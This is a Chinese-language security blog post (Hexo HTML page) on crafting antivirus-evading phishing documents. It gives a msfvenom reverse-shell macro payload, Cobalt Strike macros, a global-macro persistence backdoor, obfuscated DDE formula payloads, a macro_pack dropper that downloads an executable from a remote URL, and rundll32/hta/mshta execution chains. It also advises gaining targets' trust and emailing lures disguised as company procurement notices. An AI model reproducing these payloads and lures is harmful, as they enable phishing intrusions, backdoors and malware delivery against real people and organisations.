@@ -1,0 +1,699 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
+  <link rel="icon" type="image/png" href="/img/head.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="SE_Null">
+  <meta name="keywords" content="">
+  <title>免杀文档制作 - SE_Null</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>SE_Null</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-05 16:24" pubdate>
+        October 5, 2020 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">免杀文档制作</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>本文主要介绍一些钓鱼文档的制作方法。</p>
+<a id="more"></a>
+
+<h2 id="1-office宏攻击"><a href="#1-office宏攻击" class="headerlink" title="1.office宏攻击"></a>1.office宏攻击</h2><p>宏是微软公司为其OFFICE软件包设计的一个特殊功能，有着独特的文件后缀名，如：xlsm，docm，pptm等。</p>
+<p>office：2016教育版</p>
+<p>攻击机：kali 192.168.43.30</p>
+<h3 id="1-msf生成payload"><a href="#1-msf生成payload" class="headerlink" title="1.msf生成payload"></a>1.msf生成payload</h3><p>1.先msf生成一段payload</p>
+<pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.30 LPORT=3333 -f vba -o shell.vba</code></pre>
+
+<p>2.新建一个启用宏的office文档。</p>
+<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128001528982.png" srcset="/img/loading.gif" alt="image-20210128001528982"></p>
+<p>3.然后点击并勾选：文件-选项-自定义功能区-开发工具。</p>
+<p>4.点击宏</p>
+<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128001945054.png" srcset="/img/loading.gif" alt="image-20210128001945054"></p>
+<p>5.创建一个新的文件宏，注意宏名只能为字母或汉字，不能为数字；选择宏的位置为第一步新建的启用宏的office文档的名字</p>
+<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128000409133.png" srcset="/img/loading.gif" alt="image-20210128000409133"></p>
+<p>6.将文本框里的代码全部替换为msf生成宏代码，Ctrl+s，关闭文本框，Ctrl+s，退出。</p>
+<p>7.在靶机里打开office文档，启用宏，msf上线。</p>
+<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128000509782.png" srcset="/img/loading.gif" alt="image-20210128000509782"></p>
+<h3 id="2-cs生成payload"><a href="#2-cs生成payload" class="headerlink" title="2.cs生成payload"></a>2.cs生成payload</h3><p>步骤和msf生成payload制作木马一样，只不过需要将msf的木马替换为cs的MS Office Macro的马。</p>
+<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128001050461.png" srcset="/img/loading.gif" alt="image-20210128001050461"></p>
+<h3 id="3-建立全局宏持久性后门"><a href="#3-建立全局宏持久性后门" class="headerlink" title="3.建立全局宏持久性后门"></a>3.建立全局宏持久性后门</h3><p>office宏除了用于钓鱼，还可以用来建立隐蔽的持久性后门。新建一个宏，位置要选择所有活动模版和文档。</p>
+<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128003712029.png" srcset="/img/loading.gif" alt="image-20210128003712029"></p>
+<p>在ThisDocument中写入宏代码，进行保存。</p>
+<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128003907554.png" srcset="/img/loading.gif" alt="image-20210128003907554"></p>
+<p>成功建立了一个隐藏持久性后门，打开任意文档都可以触发宏代码。</p>
+<h3 id="4-文件图标替换"><a href="#4-文件图标替换" class="headerlink" title="4.文件图标替换"></a>4.文件图标替换</h3><p>生成宏的文档和正常的文档图标不一样</p>
+<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210128005843267.png" srcset="/img/loading.gif" alt="image-20210128005843267"></p>
+<p>还没找到可以替换文档图片的方法，，，不过知道替换exe图片的一个软件：Restorator</p>
+<h3 id="5-缺点"><a href="#5-缺点" class="headerlink" title="5.缺点"></a>5.缺点</h3><p>类似office宏还有一些其它利用方式，如DOCX文档远程模板注入执行宏，还可以通过shellcode进行免杀处理。在实战中，首先尽可能社工目标的各种信息，取得对方信任，根据钓鱼的目标，修改文档的名字，通过邮箱进行发送，如xx公司采购说明。</p>
+<p>office宏钓鱼存在几大不适用性：</p>
+<p>1、对方电脑未使用office。</p>
+<p>2、office默认禁用宏，打开文件会进行提示。</p>
+<p>3、独特的宏文件后缀，docm，xlsm等，容易引起他人怀疑。</p>
+<p>4、免杀性要求较高。</p>
+<h2 id="2-DDE"><a href="#2-DDE" class="headerlink" title="2.DDE"></a>2.DDE</h2><p>动态数据交换（DDE），它是在Microsoft Windows操作系统中实现的客户端/服务器通信方法。</p>
+<p>在开源的openoffice中可以直接调用DDE函数，像=DDE(“cmd”;”/C calc”;”123”)这样调用。</p>
+<p>而在正规的office套件中则移除了DDE函数，但是我们还是可以使用application|topic!item这一格式的三元表达式调用DDE。注意：该方法的提示窗口只提示application而不提示topic。</p>
+<p>一些特性：</p>
+<p>1、当excel遇到+和-会自动填充=成为公式，如</p>
+<pre><code class="hljs dockerfile">+thespnquisition(<span class="hljs-keyword">cmd</span><span class="bash">|<span class="hljs-string">&#x27;/c calc.exe&#x27;</span>!A</span></code></pre>
+
+<p>2、若打开的外部应用为8字符，excel自动忽略后面的字符，如下面的两个作用相同：</p>
+<pre><code class="hljs excel">=rundll32|&#x27;URL.dll,OpenURL calc.exe&#x27;!A
+=rundll321234567890abcdefghijklmnopqrstuvwxyz|&#x27;URL.dll,OpenURL calc.exe&#x27;!A</code></pre>
+
+<p>3、将其他表达式或空格填充在恶意表达式之前</p>
+<pre><code class="hljs excel">=AA+BB-CC&amp;<span class="hljs-string">&quot;Hello&quot;</span>/<span class="hljs-number">12345</span>&amp;cmd|&#x27;/c calc.exe&#x27;!A</code></pre>
+
+<p>4、通过windows batch的语法特性，填充无意义或是不影响执行逻辑的字符和指令，将topic字段混淆，如以下payload：</p>
+<pre><code class="hljs parser3"><span class="xml">=cmd|&#x27;/c REM.&amp;&amp;@p</span><span class="hljs-keyword">^o</span><span class="hljs-keyword">^w</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^r</span><span class="hljs-keyword">^s</span><span class="hljs-keyword">^h</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^l</span><span class="hljs-keyword">^l</span><span class="xml"> c:/*/*</span><span class="hljs-number">2</span><span class="xml">/?al?.?x?&quot;&#x27;!_xlbgnm.A1</span>
+
+<span class="hljs-comment">#	/c 是cmd参数，表示执行后关闭窗口</span>
+<span class="hljs-comment">#	REM 示后面的内容是注释</span>
+<span class="hljs-comment">#	. 表示空行，用于终止之前的REM</span>
+<span class="hljs-comment">#	&amp;&amp; 表示如果前一条指令执行成功则执行后一条指令</span>
+<span class="hljs-comment">#	@ 表示执行窗口不显示后面的命令</span>
+<span class="hljs-comment">#	^ 表示转义，此处无实际意义，只是用来混淆powershell这一敏感词</span>
+<span class="hljs-comment">#	? 表示powershell通配符，其中匹配任意字符串，?匹配1个字符，此处能唯一定位到c:/windows/system32/calc.exe</span>
+<span class="hljs-comment">#	“ 无实际用途，删了也没啥区别</span></code></pre>
+
+<p>所以经过解析后，实际执行的命令是:</p>
+<pre><code class="hljs awk">cmd.exe<span class="hljs-regexp">/c powershell c:/</span>windows<span class="hljs-regexp">/system32/</span>calc.exe</code></pre>
+
+<p>当然，也可以使用字符串拼接的特性，将命令变为下面这样：</p>
+<pre><code class="hljs excel">=MSEXCEL|&#x27;\..\..\..\Windows\System32\cmd.exe /c REM.&amp;&amp;@p^o^w^e^r^s^h^e^l^l <span class="hljs-symbol">c:</span>/*/*<span class="hljs-number">2</span>/?al?.?x?<span class="hljs-string">&quot;&#x27;!_xlbgnm.A1</span></code></pre>
+
+
+
+<p>msf也集成了这种攻击方式</p>
+<pre><code class="hljs awk">use exploit<span class="hljs-regexp">/windows/</span>fileformat/office_dde_delivery</code></pre>
+
+
+
+<h2 id="3-power-query-DDE"><a href="#3-power-query-DDE" class="headerlink" title="3.power query DDE"></a>3.power query DDE</h2><p>如其名,DDE的一种。Power Query是微软Excel中一个强大的工具，利用该工具的漏洞可以远程执行嵌入的恶意payload。</p>
+<p>Power Query ：<a target="_blank" rel="noopener" href="https://support.microsoft.com/zh-cn/office/power-query-%E5%85%A5%E9%97%A8-7104fbee-9e62-4cb9-a02e-5bfb1a6c536a">https://support.microsoft.com/zh-cn/office/power-query-%E5%85%A5%E9%97%A8-7104fbee-9e62-4cb9-a02e-5bfb1a6c536a</a></p>
+<p>Power Query特征可以使攻击者很容易并动态地嵌入远程内容。这种攻击很难检测，而且攻击者有更多的机会来入侵受害者机器。利用Power Query中的潜在漏洞，攻击者可以将恶意内容嵌入到payload中，但恶意内容本身并不会下载。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5514">https://xz.aliyun.com/t/5514</a></p>
+<h2 id="4-DDE-宏-lolbin"><a href="#4-DDE-宏-lolbin" class="headerlink" title="4.DDE + 宏+lolbin"></a>4.DDE + 宏+lolbin</h2><p>具体的思路如下：使用宏远程下载一个hta文件，然后依靠dde加载该hta，hta为一个启动mshta的恶意程序。</p>
+<p>首先，我们要建立一个使用宏远程下载的excel文件，如果会vbs的话可以自己进行编写，如果不会的话可以使用macro_pack进行辅助</p>
+<p>macro_pack：<a target="_blank" rel="noopener" href="https://github.com/sevagas/macro_pack">https://github.com/sevagas/macro_pack</a></p>
+<p>macro_pack windows程序：<a target="_blank" rel="noopener" href="https://github.com/sevagas/macro_pack/releases/">https://github.com/sevagas/macro_pack/releases/</a></p>
+<p>我们的目的是使用它生成一个具有下载功能的excel。我们可以使用下面的方法进行生成：</p>
+<pre><code class="hljs vala">echo <span class="hljs-string">&quot;https://myurl.url/payload.exe&quot;</span> <span class="hljs-string">&quot;dropped.exe&quot;</span> |  macro_pack.exe -t DROPPER -G <span class="hljs-string">&quot;drop.xls&quot;</span>
+<span class="hljs-meta">#https://myurl.url/payload.exe：恶意程序的地址</span>
+<span class="hljs-meta">#dropped.exe：恶意程序下载下来保存的文件名</span>
+<span class="hljs-meta">#drop.xls：生成的excel表格名</span></code></pre>
+
+<p>打开drop.xls，启用宏，就会自动下载url的payload.exe,并保存为dropped.exe，然后执行，msf上线。</p>
+<p>但是我们要做到免杀，就不要求它进行执行，所以需要对宏代码做一定的修改：</p>
+<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210129015545405.png" srcset="/img/loading.gif" alt="image-20210129015545405"></p>
+<p>将里面的ExecuteCmdAsync downloadPath给删除掉，并删除其构造代码，然后更改下载路径为你自己想要的路径，服务器地址为你的地址即可。</p>
+<p>然后我们此时打开该文档，就会提示我们运行宏，我们允许，则会在我们刚才设置的地方下载好我们的hta文件。然后我们将宏代码保存为vba文件，使用下面的命令将其混淆：</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">macro_pack</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-f</span> <span class="hljs-selector-tag">xxx</span><span class="hljs-selector-class">.vba</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">-G</span> <span class="hljs-selector-tag">xxx</span><span class="hljs-selector-class">.xls</span></code></pre>
+
+<p>然后将宏代码保存为vba文件，使用下面的命令将其混淆：</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">macro_pack</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-f</span> <span class="hljs-selector-tag">xxx</span><span class="hljs-selector-class">.vba</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">-G</span> <span class="hljs-selector-tag">xxx</span><span class="hljs-selector-class">.xls</span></code></pre>
+
+<p>然后我们下面就需要调用我们的hta文件了。我们说过了，要使用dde，我们这里就使用dde去调用rundll32.exe去运行我们的hta文件：</p>
+<pre><code class="hljs excel">=MSEXCEL|&#x27;\..\..\..\Windows\System32\rundll32.exe url.dll,FileProtocolHandler  <span class="hljs-symbol">c:</span>\temp\payload.hta&#x27;!_xlbgnm.<span class="hljs-symbol">A1</span></code></pre>
+
+<p><img src="/2020/10/05/%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/image-20210129021101468.png" srcset="/img/loading.gif" alt="image-20210129021101468"></p>
+<p>有关rundll32具体信息请访问：<a target="_blank" rel="noopener" href="https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface">https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface</a></p>
+<p>比如当前我们的hta内容如下，那么将执行内部代码弹出计算器.</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">HTML</span>&gt;</span> 
+<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">HEAD</span>&gt;</span> 
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;VBScript&quot;</span>&gt;</span>
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+<span class="javascript"><span class="hljs-built_in">Set</span> objShell = CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)</span>
+<span class="javascript">objShell.Run <span class="hljs-string">&quot;calc.exe&quot;</span></span>
+self.close
+<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">HEAD</span>&gt;</span> 
+<span class="hljs-tag">&lt;/<span class="hljs-name">HTML</span>&gt;</span></code></pre>
+
+<p>但是，仅仅这样还是不够的我们还需要其他的，我们接下来再使用攻击中常见的一种手法，mshta攻击，用法如下：</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">mshta</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">payload</span>地址</code></pre>
+
+<p>首先使用msf开启监听，然后将这里：</p>
+<pre><code class="hljs routeros"><span class="hljs-builtin-name">Set</span> objShell = CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)
+objShell.<span class="hljs-builtin-name">Run</span> <span class="hljs-string">&quot;calc.exe&quot;</span></code></pre>
+
+<p>改成mshta的利用语句并混淆，目标运行，成功上线：</p>
+<p><a target="_blank" rel="noopener" href="https://lengjibo.github.io/execl/">https://lengjibo.github.io/execl/</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lhg71lVHfp9PY1m8sYXA_A">https://mp.weixin.qq.com/s/lhg71lVHfp9PY1m8sYXA_A</a></p>
+<p>  <a target="_blank" rel="noopener" href="https://app.any.run/submissions">https://app.any.run/submissions</a> </p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/170074.html">https://www.freebuf.com/articles/network/170074.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/office%E5%AE%8F%E6%94%BB%E5%87%BB/">office宏攻击 </a>
+                    
+                      <a class="hover-with-bg" href="/tags/DDE/">DDE</a>
+                    
+                      <a class="hover-with-bg" href="/tags/power-query-DDE/">power query DDE</a>
+                    
+                      <a class="hover-with-bg" href="/tags/DDE-%E5%AE%8F-lolbin/">DDE + 宏+lolbin</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/06/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">端口转发</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/04/%E5%85%8D%E6%9D%80%E4%BA%8C-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/">
+                        <span class="hidden-mobile">免杀二-脚本语言免杀</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <!-- <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div> -->
+    
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "免杀文档制作&nbsp;",
+      ],
+      cursorChar: "",
+      typeSpeed: 100,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+  
+  
+    <script>
+      !function (e, t, a) {
+        function r() {
+          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
+          requestAnimationFrame(r)
+        }
+
+        function n() {
+          var t = "function" == typeof e.onclick && e.onclick;
+          e.onclick = function (e) {
+            t && t(), o(e)
+          }
+        }
+
+        function o(e) {
+          var a = t.createElement("div");
+          a.className = "heart", s.push({
+            el: a,
+            x: e.clientX - 5,
+            y: e.clientY - 5,
+            scale: 1,
+            alpha: 1,
+            color: c()
+          }), t.body.appendChild(a)
+        }
+
+        function i(e) {
+          var a = t.createElement("style");
+          a.type = "text/css";
+          try {
+            a.appendChild(t.createTextNode(e))
+          } catch (t) {
+            a.styleSheet.cssText = e
+          }
+          t.getElementsByTagName("head")[0].appendChild(a)
+        }
+
+        function c() {
+          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+        }
+
+        var s = [];
+        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
+          setTimeout(e, 1e3 / 60)
+        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
+      }(window, document);
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
